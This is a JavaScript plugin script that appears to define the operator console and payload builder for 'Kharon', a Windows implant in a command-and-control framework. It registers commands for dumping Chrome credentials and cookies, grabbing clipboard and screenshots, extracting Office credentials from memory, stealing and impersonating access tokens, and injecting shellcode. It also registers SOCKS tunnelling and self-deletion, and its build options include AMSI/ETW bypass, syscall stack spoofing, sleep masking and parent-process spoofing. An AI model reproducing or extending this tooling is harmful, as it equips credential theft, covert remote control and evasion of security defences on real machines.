/// Kharon agent

let exit_thread_action  = menu.create_action("Terminate thread",  function(value) { value.forEach(v => ax.execute_command(v, "exit thread")) });
let exit_process_action = menu.create_action("Terminate process", function(value) { value.forEach(v => ax.execute_command(v, "exit process")) });
let exit_menu = menu.create_menu("Exit");
exit_menu.addItem(exit_thread_action)
exit_menu.addItem(exit_process_action)
menu.add_session_agent(exit_menu, ["kharon"])


let file_browser_action    = menu.create_action("File Browser",    function(value) { value.forEach(v => ax.open_browser_files(v)) });
let process_browser_action = menu.create_action("Process Browser", function(value) { value.forEach(v => ax.open_browser_process(v)) });
menu.add_session_browser(file_browser_action, ["kharon"])
menu.add_session_browser(process_browser_action, ["kharon"])


var event_files_action = function(id, path) {
    ax.execute_browser(id, "fs ls " + path);
}
event.on_filebrowser_list(event_files_action, ["kharon"]);



var event_process_action = function(id) {
    ax.execute_browser(id, "ps list");
}
event.on_processbrowser_list(event_process_action, ["kharon"]);


function RegisterCommands(listenerType)
{
    /// FS

    let cmd_fs_cat = ax.create_command("cat", "Display the contents of a file", "fs cat C:\\logs\\app.log", "Task: read file contents");
    cmd_fs_cat.addArgString("path", true);

    let cmd_fs_cd  = ax.create_command("cd", "Change the current working directory", "fs cd C:\\Windows\\System32", "Task: change working directory");
    cmd_fs_cd.addArgString("path", true);

    let cmd_fs_cp = ax.create_command("cp", "Copy a file from source to destination", "fs cp C:\\source.txt D:\\backup\\destination.txt", "Task: copy file");
    cmd_fs_cp.addArgString("src", true);
    cmd_fs_cp.addArgString("dst", true);

    let cmd_fs_ls = ax.create_command("ls", "List files and directories in the specified path", "fs ls C:\\Windows\\Temp", "Task: list directory contents");
    cmd_fs_ls.addArgString("directory", false, ".");

    let cmd_fs_mv = ax.create_command("mv", "Move or rename a file", "fs mv C:\\old.txt C:\\new.txt", "Task: move or rename file");
    cmd_fs_mv.addArgString("src", true);
    cmd_fs_mv.addArgString("dst", true);

    let cmd_fs_mkdir = ax.create_command("mkdir", "Create a new directory", "fs mkdir C:\\Temp\\NewFolder", "Task: create directory");
    cmd_fs_mkdir.addArgString("path", true);

    let cmd_fs_pwd = ax.create_command("pwd", "Display the current working directory path", "fs pwd", "Task: print working directory");

    let cmd_fs_rm = ax.create_command("rm", "Delete a file from the filesystem", "fs rm C:\\Temp\\unwanted.log", "Task: remove file");
    cmd_fs_rm.addArgString("path", true);

    let cmd_fs = ax.create_command("fs", "Filesystem operations - manage files and directories", "fs ls");
    cmd_fs.addSubCommands([cmd_fs_cat, cmd_fs_cd, cmd_fs_cp, cmd_fs_ls, cmd_fs_mv, cmd_fs_mkdir, cmd_fs_pwd, cmd_fs_rm]);

    /// EXIT

    let cmd_exit_thread = ax.create_command("thread", "Terminate the main Kharon thread", "exit thread", "Task: terminate agent thread");
    let cmd_exit_process = ax.create_command("process", "Terminate the entire Kharon process", "exit process", "Task: terminate agent process");
    let cmd_exit = ax.create_command("exit", "Terminate the current session");
    cmd_exit.addSubCommands([cmd_exit_thread, cmd_exit_process]);

    /// PS

    let cmd_ps_list = ax.create_command("list", "Display all running processes", "ps list", "Task: enumerate running processes");
    
    let _cmd_ps_kill = ax.create_command("kill", "Terminate a process by its Process ID (PID)", "ps kill 1234", "Task: terminate process");
    _cmd_ps_kill.addArgInt("pid", true);
    
    let cmd_ps_run = ax.create_command("run", "Execute a new process with specified command line", "ps run \"cmd.exe /c whoami /all\"", "Task: create and execute new process");
    cmd_ps_run.addArgString("cmd", true, "Full command line with arguments");
    
    let cmd_ps = ax.create_command("ps", "Process management - list, create, and terminate processes");
    cmd_ps.addSubCommands([cmd_ps_list, cmd_ps_run, _cmd_ps_kill]);

    /// STEALER

    let cmd_stealer_browserdmp = ax.create_command("browser-dump", "Extract saved credentials and cookies from browser profile", "stealer browser-dump chrome", "Task: dump browser credentials and cookies");
    cmd_stealer_browserdmp.addArgString("browser_name", true, "Browser name (currently only 'chrome' is supported)");

    let cmd_stealer_screenshot = ax.create_command("screenshot", "Capture a screenshot of the current desktop", "stealer screenshot", "Task: capture desktop screenshot");

    let cmd_stealer_clipdump = ax.create_command("clipdump", "Retrieve current clipboard contents", "stealer clipdump", "Task: dump clipboard data");

    let cmd_stealer_officedump = ax.create_command("office-dump", "Extract credentials from Microsoft Office process memory", "stealer office-dump 1234", "Task: dump Office credentials from memory");
    cmd_stealer_officedump.addArgInt("office_pid", true, "Process ID of running Office application");

    let cmd_stealer = ax.create_command("stealer", "Information gathering and credential extraction operations");
    cmd_stealer.addSubCommands([cmd_stealer_browserdmp, cmd_stealer_clipdump, cmd_stealer_screenshot, cmd_stealer_officedump]);

    /// JOB
    /// let cmd_job_list = ax.create_command("list", "Display all currently running background jobs", "job list", "Task: enumerate running jobs");

    /// let cmd_job = ax.create_command("job", "Background job management - monitor and control asynchronous tasks");
    /// cmd_job.addSubCommands([cmd_job_list]);

    /// TOKEN

    let cmd_token_getuid = ax.create_command("getuid", "Display the username associated with the current access token", "token getuid", "Task: retrieve current token username");

    let cmd_token_steal = ax.create_command("steal", "Steal and optionally use an access token from a target process", "token steal 608 true", "Task: steal access token from process");
    cmd_token_steal.addArgInt("pid", true);
    cmd_token_steal.addArgBool("impersonate", false, "Immediately use the stolen token");

    let cmd_token_use = ax.create_command("impersonate", "Apply a previously stolen access token from storage", "token impersonate 608", "Task: impersonate stored access token");
    cmd_token_use.addArgInt("token_id", true);

    let cmd_token_rm = ax.create_command("rm", "Remove an access token from storage", "token rm 608", "Task: delete stored token");
    cmd_token_rm.addArgInt("token_id", true);

    let cmd_token_revert = ax.create_command("revert", "Restore the original access token", "token revert", "Task: revert to original token");

    let cmd_token_list = ax.create_command("list", "List all tokens", "token list", "Task: list tokens");

    let cmd_token_make = ax.create_command("make", "Create an impersonation token using provided credentials", "token make -u admin -p P@ssw0rd -d domain.local", "Task: create impersonation token");
    cmd_token_make.addArgFlagString("-u", "username", "Username", true);
    cmd_token_make.addArgFlagString("-p", "password", "Password", true);
    cmd_token_make.addArgFlagString("-d", "domain", "Domain name");

    let cmd_token_privget = ax.create_command("privget", "Retrieve detailed privileges of the current token", "token privget", "Task: get token privileges");

    let cmd_token_privlist = ax.create_command("privlist", "List all privileges associated with the current token", "token privlist", "Task: enumerate token privileges");

    let cmd_token = ax.create_command("token", "Access token management - steal, create, and manipulate tokens");
    cmd_token.addSubCommands([cmd_token_getuid, cmd_token_list, cmd_token_steal, cmd_token_use, cmd_token_rm, cmd_token_revert, cmd_token_make, cmd_token_privget, cmd_token_privlist]);

    /// CONFIG

    let cmd_config_sleep = ax.create_command("sleep", "Set the sleep interval between callbacks", "config sleep 30m5s", "Task: configure sleep interval");
    cmd_config_sleep.addArgString("val", true, "Time in '%h%m%s' format or number of seconds");

    let cmd_config_jitter = ax.create_command("jitter", "Set the jitter percentage for sleep randomization", "config jitter 50", "Task: configure jitter percentage");
    cmd_config_jitter.addArgInt("val", true, "Maximum random percentage (0-100) added to sleep interval");

    let cmd_config_ppid = ax.create_command("ppid", "Set the parent process ID for process spoofing", "config ppid 808", "Task: configure parent process ID");
    cmd_config_ppid.addArgInt("pid", true);

    let cmd_config_blockdll = ax.create_command("blockdlls", "Block non-Microsoft DLLs from loading in child processes", "config blockdlls true", "Task: configure DLL blocking");
    cmd_config_blockdll.addArgString("status", true, "Enable (true) or disable (false)");

    let cmd_config_killdate_date = ax.create_command("killdate.date", "Set the kill date when the beacon will self-terminate", "config killdate.date 28.02.2030", "Task: configure kill date");
    cmd_config_killdate_date.addArgString("date", true, "Date in 'DD.MM.YYYY' format, or '0' to disable");

    let cmd_config_killdate_exit = ax.create_command("killdate.exit", "Configure the termination method when kill date is reached", "config killdate.exit process", "Task: configure kill date exit method");
    cmd_config_killdate_exit.addArgString("method", true, "Termination method: 'process' or 'thread'");

    let cmd_config_killdate_selfdel = ax.create_command("killdate.selfdel", "Enable self-deletion when kill date is reached", "config killdate.selfdel true", "Task: configure kill date self-deletion");
    cmd_config_killdate_selfdel.addArgString("status", true, "Enable (true) or disable (false)");

    let cmd_config_heap_obf = ax.create_command("mask.heap", "Enable heap obfuscation for memory protection", "config mask.heap true", "Task: configure heap obfuscation");
    cmd_config_heap_obf.addArgString("status", true, "Enable (true) or disable (false)");

    let cmd_config_mask = ax.create_command("mask.beacon", "Configure beacon masking technique", "config mask.beacon timer", "Task: configure beacon masking");
    cmd_config_mask.addArgString("type", true, "Masking type: 'none' or 'timer'");

    let cmd_config_amsietwbypass = ax.create_command("amsi_etw_bypass", "Configure AMSI and ETW bypass mechanisms", "config amsi_etw_bypass all", "Task: configure AMSI/ETW bypass");
    cmd_config_amsietwbypass.addArgString("bypass", true, "Bypass target: 'all', 'amsi', 'etw', or 'none'");

    let cmd_config_spawnto = ax.create_command("spawnto", "Set the executable path for spawning new processes", "config spawnto C:\\Windows\\System32\\rundll32.exe", "Task: configure spawn target");
    cmd_config_spawnto.addArgString("path", true);

    let cmd_config_inject_alloc = ax.create_command("inject.alloc", "Change allocation method to shellcode injection routines", "config inject.alloc drip", "Task: configure allocation method");
    cmd_config_inject_alloc.addArgString("alloc", true, "Options 'drip' or 'standard'");

    let cmd_config_inject_write = ax.create_command("inject.write", "Change write method to shellcode injection routines", "config inject.write apc", "Task: configure write method");
    cmd_config_inject_write.addArgString("write", true, "Options 'apc' or 'standard'");

    let cmd_config_wkrtime = ax.create_command("worktime", "Set operational hours for beacon activity", "config worktime 09:00 18:00", "Task: configure working hours");
    cmd_config_wkrtime.addArgString("start", true);
    cmd_config_wkrtime.addArgString("end", true);

    let cmd_config_syscall = ax.create_command("syscall", "Change the syscall method", "config syscall spoof_indirect");
    cmd_config_syscall.addArgFlagString("syscall", true, "options: 'spoof', 'spoof_indirect' or 'none'");

    let cmd_config = ax.create_command("config", "Configuration management - adjust beacon behavior and settings", "config sleep 50s");
    cmd_config.addSubCommands([
        cmd_config_sleep, cmd_config_jitter, cmd_config_ppid, cmd_config_blockdll, cmd_config_wkrtime,
        cmd_config_killdate_date, cmd_config_killdate_exit, cmd_config_killdate_selfdel, 
        cmd_config_heap_obf, cmd_config_mask, cmd_config_amsietwbypass, cmd_config_spawnto,
        cmd_config_inject_write, cmd_config_inject_alloc, cmd_config_syscall
    ]);

    /// INFO

    let cmd_info = ax.create_command("info", "Display comprehensive beacon information and system details", "info", "Task: retrieve beacon information");

    // UPLOAD
    let cmd_upload = ax.create_command("upload", "Upload a file", "upload /tmp/file.txt C:\Temp\file.txt", "Task: upload file");
    cmd_upload.addArgFile("local_file", true);
    cmd_upload.addArgString("remote_path", false);

    // DOWNLOAD
    let cmd_download = ax.create_command("download", "Download a file", "download C:\\Temp\\file.txt", "Task: download file");
    cmd_download.addArgString("remote_path", false);

    // SOCKET

    let cmd_socks_start = ax.create_command("start", "Start a SOCKS5 proxy server and listen on a specified port", "socks start 1080 -a user pass");
    cmd_socks_start.addArgFlagString("-h", "address", "Listening interface address", "0.0.0.0");
    cmd_socks_start.addArgInt("port", true, "Listen port");
    cmd_socks_start.addArgBool("-a", "Enable User/Password authentication for SOCKS5");
    cmd_socks_start.addArgString("username", false, "Username for SOCKS5 proxy");
    cmd_socks_start.addArgString("password", false, "Password for SOCKS5 proxy");

    let cmd_socks_stop = ax.create_command("stop", "Stop a SOCKS proxy server", "socks stop 1080");
    cmd_socks_stop.addArgInt("port", true);
    let cmd_socks = ax.create_command("socks", "Managing socks tunnels");
    cmd_socks.addSubCommands([cmd_socks_start, cmd_socks_stop]);

    let cmd_rportfwd_start = ax.create_command("start", "Start remote port forwarding from agent via server", "rportfwd start 8080 10.10.10.14 8080");
    cmd_rportfwd_start.addArgInt("lport", true, "Listen port on agent");
    cmd_rportfwd_start.addArgString("fwdhost", true, "Remote forwarding address");
    cmd_rportfwd_start.addArgInt("fwdport", true, "Remote forwarding port");

    let cmd_rportfwd_stop = ax.create_command("stop", "Stop remote port forwarding", "rportfwd stop 8080");
    cmd_rportfwd_stop.addArgInt("lport", true);
    let cmd_rportfwd = ax.create_command("rportfwd", "Managing remote port forwarding");
    cmd_rportfwd.addSubCommands([cmd_rportfwd_start, cmd_rportfwd_stop]);

    /// SCINJECT

    let cmd_scinject = ax.create_command("scinject", "Inject raw shellcode into a target process by PID", "scinject /tmp/payload.bin 1234", "Task: inject shellcode into process");
    cmd_scinject.addArgFile("shellcode", true);
    cmd_scinject.addArgInt("pid", true);

    /// SELF_DELETE
    
    let cmd_selfdel = ax.create_command("selfdel", "Delete the beacon file from disk while maintaining the active session", "selfdel", "Task: self-delete beacon file");

    /// EXECUTE

    let cmd_exec_bof = ax.create_command("bof", "Execute a Beacon Object File (BOF) with optional parameters", "execute bof /home/user/whoami.o params", "Task: execute Beacon Object File");
    cmd_exec_bof.addArgFile("bof_file", true, "Path to compiled object file (.o)");
    cmd_exec_bof.addArgString("param_data", false);

    let cmd_exec_postex = ax.create_command("postex", "Execute post-exploitation shellcode inline or forked", "execute postex -m inline -t none -p 0 -f /tmp/module.bin -a params", "Task: execute post-exploitation module");
    cmd_exec_postex.addArgFlagString("-m", "method", "Execution method: 'inline' (current process) or 'fork' (new/existing process)", "inline");
    cmd_exec_postex.addArgFlagString("-t", "fork_type", "Fork type: 'spawn' (new process) or 'explicit' (existing PID)", "none");
    cmd_exec_postex.addArgFlagInt("-p", "pid", "Target PID for explicit fork injection", 0);
    cmd_exec_postex.addArgFlagFile("-f", "sc_file", "Shellcode file", true);
    cmd_exec_postex.addArgFlagString("-a", "param_data", "Shellcode parameters");

    let cmd_execute = ax.create_command("execute", "Execute Beacon Object Files or post-exploitation shellcode modules");
    cmd_execute.addSubCommands([cmd_exec_bof, cmd_exec_postex]);

    if(listenerType == "KharonHTTP") {
        let commands_external = ax.create_commands_group("kharon", [
            cmd_info, cmd_config, cmd_exit, cmd_selfdel, cmd_execute, 
            cmd_fs, cmd_ps, cmd_token, cmd_scinject, cmd_upload,
            cmd_download, cmd_socks, cmd_rportfwd
        ]);
        
        return { commands_windows: commands_external }
    }

    return ax.create_commands_group("none",[]);
}

function GenerateUI(listenerType)
{
    // Format combo (topo)
    let labelFormat = form.create_label("Compilation Format:");
    let comboFormat = form.create_combo();
    comboFormat.addItem("Exe");
    comboFormat.addItem("Dll");
    comboFormat.addItem("Bin");
    comboFormat.addItem("Svc");
    comboFormat.setCurrentIndex(0);

    // Debug Mode
    let debug_check = form.create_check("Debug Mode");
    debug_check.setChecked(false);

    // Sleep / Jitter
    let labelSleep  = form.create_label("Sleep (Jitter %):");
    let textSleep = form.create_textline("3s");
    textSleep.setPlaceholder("1h 2m 5s")
    let spinJitter = form.create_spin();
    spinJitter.setRange(0, 100);
    spinJitter.setValue(0);

    // Guardrails Settings
    let labelGuardrails = form.create_label("Guardrails:");
    let textGuardrailsIP = form.create_textline("");
    textGuardrailsIP.setPlaceholder("IP Address");
    let textGuardrailsHostname = form.create_textline("");
    textGuardrailsHostname.setPlaceholder("Hostname");
    let textGuardrailsUser = form.create_textline("");
    textGuardrailsUser.setPlaceholder("Username");
    let textGuardrailsDomain = form.create_textline("");
    textGuardrailsDomain.setPlaceholder("Domain");
    
    let layout_guardrails = form.create_gridlayout();
    layout_guardrails.addWidget(labelGuardrails,         0, 0, 1, 1);
    layout_guardrails.addWidget(textGuardrailsIP,        0, 1, 1, 1);
    layout_guardrails.addWidget(textGuardrailsHostname,  0, 2, 1, 1);
    layout_guardrails.addWidget(textGuardrailsUser,      1, 1, 1, 1);
    layout_guardrails.addWidget(textGuardrailsDomain,    1, 2, 1, 1);
    let panel_guardrails = form.create_panel();
    panel_guardrails.setLayout(layout_guardrails);
    let guardrails_group = form.create_groupbox("Guardrails Settings", false);
    guardrails_group.setPanel(panel_guardrails);

    // Killdate Settings
    let killdate_group = form.create_groupbox("Killdate Settings", true);
    
    let labelKilldateDate = form.create_label("Date:");
    let dateKill = form.create_dateline("dd.MM.yyyy");
    
    let labelKilldateExit = form.create_label("Exit Method:");
    let comboKilldateExit = form.create_combo();
    comboKilldateExit.addItem("Process");
    comboKilldateExit.addItem("Thread");
    comboKilldateExit.setCurrentIndex(0);
    
    let checkKilldateSelfDel = form.create_check("Self Delete");
    checkKilldateSelfDel.setChecked(false);
    
    let layout_killdate = form.create_gridlayout();
    layout_killdate.addWidget(labelKilldateDate,     0, 0, 1, 1);
    layout_killdate.addWidget(dateKill,              0, 1, 1, 2);
    layout_killdate.addWidget(labelKilldateExit,     1, 0, 1, 1);
    layout_killdate.addWidget(comboKilldateExit,     1, 1, 1, 1);
    layout_killdate.addWidget(checkKilldateSelfDel,  1, 2, 1, 1);
    let panel_killdate = form.create_panel();
    panel_killdate.setLayout(layout_killdate);
    killdate_group.setPanel(panel_killdate);
    killdate_group.setChecked(false);

    // Workingtime
    let checkWorkingTime = form.create_check("Set 'workingtime'");
    let timeStart        = form.create_timeline("HH:mm");
    let timeFinish       = form.create_timeline("HH:mm");

    let layout_workingtime = form.create_gridlayout();
    layout_workingtime.addWidget(checkWorkingTime, 0, 0, 1, 1);
    layout_workingtime.addWidget(timeStart,        0, 1, 1, 1);
    layout_workingtime.addWidget(timeFinish,       0, 2, 1, 1);
    let panel_workingtime = form.create_panel();
    panel_workingtime.setLayout(layout_workingtime);
    let workingtime_group = form.create_groupbox("Working Time Settings", false);
    workingtime_group.setPanel(panel_workingtime);

    // PostEx Settings
    let labelPipename = form.create_label("Fork pipename:");
    let textPipename  = form.create_textline("\\\\.\\pipe\\kharon_pipe");
    let labelSpawnTo  = form.create_label("Spawn to:");
    let textSpawnTo   = form.create_textline("C:\\Windows\\System32\\notepad.exe");
    let layout_postex = form.create_gridlayout();
    layout_postex.addWidget(labelPipename, 0, 0, 1, 1);
    layout_postex.addWidget(textPipename,  0, 1, 1, 1);
    layout_postex.addWidget(labelSpawnTo,  1, 0, 1, 1);
    layout_postex.addWidget(textSpawnTo,   1, 1, 1, 1);
    let panel_postex = form.create_panel();
    panel_postex.setLayout(layout_postex);
    let postex_group = form.create_groupbox("PostEx Settings", false)
    postex_group.setPanel(panel_postex);

    // Evasion Settings
    let labelBypass = form.create_label("Bypass:");
    let bypass_combo = form.create_combo();
    bypass_combo.addItem("None");
    bypass_combo.addItem("AMSI");
    bypass_combo.addItem("ETW");
    bypass_combo.addItem("AMSI + ETW");
    bypass_combo.setCurrentIndex(0);

    let bof_api_check = form.create_check("BOF API Proxy");
    bof_api_check.setChecked(false);

    // Syscall multi-choice (combo)
    let labelSyscall = form.create_label("Syscall:");
    let syscall_combo = form.create_combo();
    syscall_combo.addItem("None");
    syscall_combo.addItem("Stack Spoof");
    syscall_combo.addItem("Stack Spoof + Indirect");
    syscall_combo.setCurrentIndex(0);

    let layout_evasion = form.create_gridlayout();
    layout_evasion.addWidget(labelBypass, 0, 0, 1, 1);
    layout_evasion.addWidget(bypass_combo, 0, 1, 1, 1);
    layout_evasion.addWidget(labelSyscall, 1, 0, 1, 1);
    layout_evasion.addWidget(syscall_combo, 1, 1, 1, 1);
    layout_evasion.addWidget(bof_api_check, 2, 0, 1, 1);
    let panel_evasion = form.create_panel();
    panel_evasion.setLayout(layout_evasion);
    let evasion_group = form.create_groupbox("Evasion settings", false)
    evasion_group.setPanel(panel_evasion);

    // Mask Settings
    let labelSleepMask = form.create_label("Sleep Mask:");
    let sleep_mask_combo = form.create_combo();
    sleep_mask_combo.addItem("None");
    sleep_mask_combo.addItem("Timer");
    sleep_mask_combo.setCurrentIndex(0);

    let heap_obf_check = form.create_check("Heap Obfuscation");
    heap_obf_check.setChecked(false);

    let layout_mask = form.create_gridlayout();
    layout_mask.addWidget(labelSleepMask,   0, 0, 1, 1);
    layout_mask.addWidget(sleep_mask_combo, 0, 1, 1, 1);
    layout_mask.addWidget(heap_obf_check,   0, 2, 1, 1);
    let panel_mask = form.create_panel();
    panel_mask.setLayout(layout_mask);
    let mask_group = form.create_groupbox("Mask Settings", false);
    mask_group.setPanel(panel_mask);

    // Layout principal em grid
    let layout_scroll = form.create_gridlayout();
    layout_scroll.addWidget(labelFormat,        0, 0, 1, 1);
    layout_scroll.addWidget(comboFormat,        0, 1, 1, 1);
    layout_scroll.addWidget(debug_check,        0, 2, 1, 1);
    layout_scroll.addWidget(labelSleep,         1, 0, 1, 1);
    layout_scroll.addWidget(textSleep,          1, 1, 1, 1);
    layout_scroll.addWidget(spinJitter,         1, 2, 1, 1);
    layout_scroll.addWidget(guardrails_group,   2, 0, 1, 3);
    layout_scroll.addWidget(killdate_group,     3, 0, 1, 3);
    layout_scroll.addWidget(workingtime_group,  4, 0, 1, 3);
    layout_scroll.addWidget(postex_group,       5, 0, 1, 3);
    layout_scroll.addWidget(evasion_group,      6, 0, 1, 3);
    layout_scroll.addWidget(mask_group,         7, 0, 1, 3);

    let panel_scroll = form.create_panel();
    panel_scroll.setLayout(layout_scroll);

    const scroll = form.create_scrollarea();
    scroll.setPanel(panel_scroll);

    let layout = form.create_gridlayout();
    layout.addWidget(scroll, 0, 0, 1, 1);

    let container = form.create_container()
    container.put("format", comboFormat)
    container.put("sleep", textSleep)
    container.put("jitter", spinJitter)
    
    // Guardrails
    container.put("guardrails_ip", textGuardrailsIP)
    container.put("guardrails_hostname", textGuardrailsHostname)
    container.put("guardrails_user", textGuardrailsUser)
    container.put("guardrails_domain", textGuardrailsDomain)
    
    // Killdate
    container.put("killdate_check", killdate_group)
    container.put("killdate_date", dateKill)
    container.put("killdate_exit", comboKilldateExit)
    container.put("killdate_selfdel", checkKilldateSelfDel)
    
    // Workingtime
    container.put("workingtime_check", checkWorkingTime)
    container.put("workingtime_start", timeStart)
    container.put("workingtime_end", timeFinish)
    
    // PostEx
    container.put("fork_pipename", textPipename)
    container.put("spawnto", textSpawnTo)
    
    // Evasion
    container.put("bypass", bypass_combo)
    container.put("bof_api_proxy", bof_api_check)
    container.put("syscall", syscall_combo)
    
    // Mask
    container.put("mask_heap", heap_obf_check)
    container.put("mask_sleep", sleep_mask_combo)
    container.put("debug_mode", debug_check)

    let panel = form.create_panel()
    panel.setLayout(layout)

    return {
        ui_panel: panel,
        ui_container: container
    }
}
